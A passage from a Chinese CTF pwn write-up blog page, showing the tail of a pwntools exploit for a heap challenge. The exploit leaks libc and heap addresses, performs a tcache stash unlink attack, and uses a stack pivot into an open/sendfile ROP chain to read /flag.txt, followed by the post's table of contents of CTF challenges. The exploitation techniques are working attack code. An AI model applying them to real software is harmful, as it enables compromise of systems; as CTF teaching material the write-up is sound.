show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1e4ca0</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc.address'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">)</span>
heap<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x34d0</span>
target<span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0xa60</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/flag.txt\x00'</span><span class="token punctuation">)</span>   
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#切割</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">#fakechunk</span>
fakechunk_addr<span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0x4510</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x300</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#tcache stash unlink</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>   
leak_info<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span>target<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'fakechunk_addr'</span><span class="token punctuation">,</span>fakechunk_addr<span class="token punctuation">)</span>
pop_rdi_ret<span class="token operator">=</span><span class="token number">0x26542</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rsi_ret<span class="token operator">=</span><span class="token number">0x026f9e</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rdx_ret<span class="token operator">=</span><span class="token number">0x12bda6</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rax_ret<span class="token operator">=</span><span class="token number">0x047cf8</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_r10_ret<span class="token operator">=</span><span class="token number">0x012bda5</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
syscall <span class="token operator">=</span> <span class="token number">0xcf6c5</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
leave_ret<span class="token operator">=</span><span class="token number">0x58373</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
flag_addr <span class="token operator">=</span> heap<span class="token operator">+</span><span class="token number">0x3d00</span>
rop_chain<span class="token operator">=</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token comment">#open</span>
rop_chain<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r10_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token comment">#sendfile</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>content<span class="token operator">=</span>rop_chain<span class="token punctuation">)</span>
rop_addr<span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0x4828</span>
black<span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#栈迁移</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


























    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>0xahh
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://howahh.github.io.git/2024/09/26/pwn-wp1/" title="pwn_wp1">https://howahh.github.io.git/2024/09/26/pwn-wp1/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/09/26/ctfshow-sql/" rel="prev" title="ctfshow_sql">
      <i class="fa fa-chevron-left"></i> ctfshow_sql
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-writeup%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">pwn writeup记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-buu-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart"><span class="nav-number">1.1.</span> <span class="nav-text">1.buu 护网杯_2018_gettingstart</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-buu-ciscn-2019-en-3%EF%BC%88puts%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cuaf%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">2.buu ciscn_2019_en_3（puts函数漏洞，uaf）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-buu-gyctf-2020-some-thing-exceting-2-23double-free"><span class="nav-number">1.3.</span> <span class="nav-text">3.buu gyctf_2020_some_thing_exceting(2.23double free)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-NSSCTF-CISCN-2021-%E5%88%9D%E8%B5%9B-lonelywolf-tcache-uaf-amp-tcache-perthread-struct"><span class="nav-number">1.4.</span> <span class="nav-text">4.NSSCTF  CISCN 2021 初赛 lonelywolf(tcache uaf &amp; tcache_perthread_struct)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-NSS-CISCN-2021-%E5%88%9D%E8%B5%9B-silverwolf%EF%BC%88setcontext%EF%BC%8Cuaf%EF%BC%8Cdouble-free%EF%BC%89"><span class="nav-number">1.5.</span> <span class="nav-text">5.NSS [CISCN 2021 初赛]silverwolf（setcontext，uaf，double free）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-buu-starctf-2019-babyshell-shellcode"><span class="nav-number">1.6.</span> <span class="nav-text">6.buu starctf_2019_babyshell(shellcode)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-CISCN-2024%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%EF%BC%88%E9%AB%98%E7%89%88%E6%9C%ACtcache%E5%88%A9%E7%94%A8%EF%BC%8Cuaf%EF%BC%89%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D"><span class="nav-number">1.7.</span> <span class="nav-text">7.CISCN 2024华南分区赛pwn（高版本tcache利用，uaf）很有意思</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-BUU-ciscn-2019-sw-1%EF%BC%8832%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8Cfini-array%E5%88%A9%E7%94%A8%EF%BC%89"><span class="nav-number">1.8.</span> <span class="nav-text">8.BUU ciscn_2019_sw_1（32位格式化字符串，fini_array利用）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-BUU-ciscn-2019-final-2-doublefree-fileno%E5%8A%AB%E6%8C%81"><span class="nav-number">1.9.</span> <span class="nav-text">9.BUU ciscn_2019_final_2(doublefree,fileno劫持)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-BUU-rootersctf-2019-srop-srop"><span class="nav-number">1.10.</span> <span class="nav-text">10.BUU rootersctf_2019_srop(srop)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-BUU-gyctf-2020-signin-calloc%E5%88%A9%E7%94%A8%EF%BC%8C%E6%9C%89%E7%82%B9%E7%B1%BB%E4%BC%BCfastbin-reverse-into-tcache"><span class="nav-number">1.11.</span> <span class="nav-text">11.BUU gyctf_2020_signin(calloc利用，有点类似fastbin reverse into tcache)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-BUU-picoctf-2018-are-you-root%EF%BC%88%E4%BA%8C%E7%BA%A7%E6%8C%87%E9%92%88%EF%BC%89"><span class="nav-number">1.12.</span> <span class="nav-text">12.BUU picoctf_2018_are you root（二级指针）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-BUU-xman-2019-format%EF%BC%88%E5%A0%86%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E7%88%86%E7%A0%B4%E4%B8%80%E4%BD%8D%EF%BC%89"><span class="nav-number">1.13.</span> <span class="nav-text">13.BUU xman_2019_format（堆上格式化字符串_爆破一位）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-BUU-hgame2018-flag-server%EF%BC%88%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%EF%BC%89"><span class="nav-number">1.14.</span> <span class="nav-text">14.BUU hgame2018_flag_server（整数溢出）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-BUU-qctf2018-stack2%EF%BC%88%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%BF%94%E5%9B%9E%E4%BD%8D%E7%BD%AE%EF%BC%89"><span class="nav-number">1.15.</span> <span class="nav-text">15 BUU qctf2018_stack2（数组溢出，返回位置）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-BUU-ciscn-2019-final-5%EF%BC%88%E4%B8%B4%E7%95%8C%E6%9D%A1%E4%BB%B6%E9%94%99%E8%AF%AF%EF%BC%8C%E4%BF%AE%E6%94%B9got%E8%A1%A8%EF%BC%89"><span class="nav-number">1.16.</span> <span class="nav-text">16.BUU ciscn_2019_final_5（临界条件错误，修改got表）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-%E7%88%B1%E6%98%A5%E7%A7%8B2024%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BShuffled-Execution%EF%BC%88shellcode%EF%BC%8Cmmap%EF%BC%8Cwritev%EF%BC%8Copenat%EF%BC%89"><span class="nav-number">1.17.</span> <span class="nav-text">17.爱春秋2024网络安全联赛Shuffled_Execution（shellcode，mmap，writev，openat）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-BUU-sctf-2019-easy-heap-off-by-none%EF%BC%8C%E4%B8%8D%E6%B3%84%E9%9C%B2libc"><span class="nav-number">1.18.</span> <span class="nav-text">18.BUU sctf_2019_easy_heap(off by none，不泄露libc)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-WKCTF-baby-stack-%E6%A0%88%E4%B8%8Aoff-by-none"><span class="nav-number">1.19.</span> <span class="nav-text">19.WKCTF baby_stack(栈上off by none)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-BUU-roarctf-2019-realloc-magic-realloc%E5%88%A9%E7%94%A8%EF%BC%8CIO-leak%E4%BD%BF%E7%94%A8"><span class="nav-number">1.20.</span> <span class="nav-text">20.BUU roarctf_2019_realloc_magic(realloc利用，IO leak使用)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-BUU-ciscn-2019-n-7%EF%BC%88exit-hook%EF%BC%89"><span class="nav-number">1.21.</span> <span class="nav-text">21.BUU ciscn_2019_n_7（exit_hook）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#22-BUU-npuctf-2020-level2%EF%BC%88BSS%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89"><span class="nav-number">1.22.</span> <span class="nav-text">22.BUU npuctf_2020_level2（BSS上格式化字符串）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23-BUU-hitcon-ctf-2019-one-punch%EF%BC%88tcache-stashing-unlink-attack%EF%BC%8C%E5%A0%86%E4%B8%8Arop%EF%BC%9F%EF%BC%89"><span class="nav-number">1.23.</span> <span class="nav-text">23.BUU hitcon_ctf_2019_one_punch（tcache stashing unlink attack，堆上rop？）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#24-BUU-sleepyHolder-hitcon-2016%EF%BC%88malloc-consolidate%E5%88%A9%E7%94%A8%EF%BC%8Cunlink%EF%BC%89"><span class="nav-number">1.24.</span> <span class="nav-text">24.BUU sleepyHolder_hitcon_2016（malloc_consolidate利用，unlink）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#25-BUU-sctf-2019-one-heap-tcache-perthread-struct%E5%88%A9%E7%94%A8%EF%BC%8CIOleak%EF%BC%8C%E7%88%86%E7%A0%B4"><span class="nav-number">1.25.</span> <span class="nav-text">25.BUU sctf_2019_one_heap(tcache_perthread_struct利用，IOleak，爆破)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#26-TFC-CTF-MCBACK2DABASICS-house-of-spirit%EF%BC%8CIO-Leak%EF%BC%8Crealloc%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7%EF%BC%8Cglibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="nav-number">1.26.</span> <span class="nav-text">26.TFC CTF MCBACK2DABASICS(house_of_spirit，IO Leak，realloc调整栈帧，glibc源码调试)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#27-BUU-hctf2018-the-end-exit-hook-%E6%A0%87%E5%87%86%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91exec-1-gt-amp-0"><span class="nav-number">1.27.</span> <span class="nav-text">27.BUU hctf2018_the_end(exit_hook,标准输出重定向exec 1&gt;&amp;0)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#28-NSS3rd-ezheap%EF%BC%8C-%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bhouse-of-botcake-house-of-apple2"><span class="nav-number">1.28.</span> <span class="nav-text">28.NSS3rd ezheap，(从一道题看house of botcake,house of apple2)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-botcake"><span class="nav-number">1.28.1.</span> <span class="nav-text">house of botcake</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-apple2"><span class="nav-number">1.28.2.</span> <span class="nav-text">house of apple2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#29-qctf-2018-dice-game%EF%BC%88%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%A9%E7%94%A8%EF%BC%89"><span class="nav-number">1.29.</span> <span class="nav-text">29.qctf_2018_dice_game（伪随机数利用）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#30-BUU-x-nuca-2018-offbyone2%EF%BC%88off-by-none%EF%BC%8Cdouble-free%EF%BC%89"><span class="nav-number">1.30.</span> <span class="nav-text">30.BUU x_nuca_2018_offbyone2（off by none，double free）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#31-BUU-ciscn-2019-es-5-realloc%E9%80%A0%E6%88%90double-free"><span class="nav-number">1.31.</span> <span class="nav-text">31.BUU ciscn_2019_es_5(realloc造成double free)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#32-BUU-mrctf2020-spfa%EF%BC%88spfa%E7%AE%97%E6%B3%95%EF%BC%8C%E8%BE%B9%E7%95%8C%E6%9D%A1%E4%BB%B6%E9%94%99%E8%AF%AF%EF%BC%89"><span class="nav-number">1.32.</span> <span class="nav-text">32.BUU mrctf2020_spfa（spfa算法，边界条件错误）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#33-BUU-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-treasure%EF%BC%88shellcode%EF%BC%89"><span class="nav-number">1.33.</span> <span class="nav-text">33.BUU 鹏城杯_2018_treasure（shellcode）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#34-BUU-TWCTF-online-2019-asterisk-alloc-realloc%E7%BC%BA%E9%99%B7%EF%BC%8CIO-leak%E7%88%86%E7%A0%B4"><span class="nav-number">1.34.</span> <span class="nav-text">34.BUU TWCTF_online_2019_asterisk_alloc(realloc缺陷，IO_leak爆破)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#35-BUU-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN2-tcache-stash-unlink-attack%EF%BC%8Corw"><span class="nav-number">1.35.</span> <span class="nav-text">35.BUU Black Watch 入群题 PWN2(tcache stash unlink attack，orw)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-stash-unlink"><span class="nav-number">1.35.1.</span> <span class="nav-text">tcache stash unlink</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">0xahh</p>
  <div class="site-description" itemprop="description">技术</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/howahh" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;howahh" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">0xahh</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
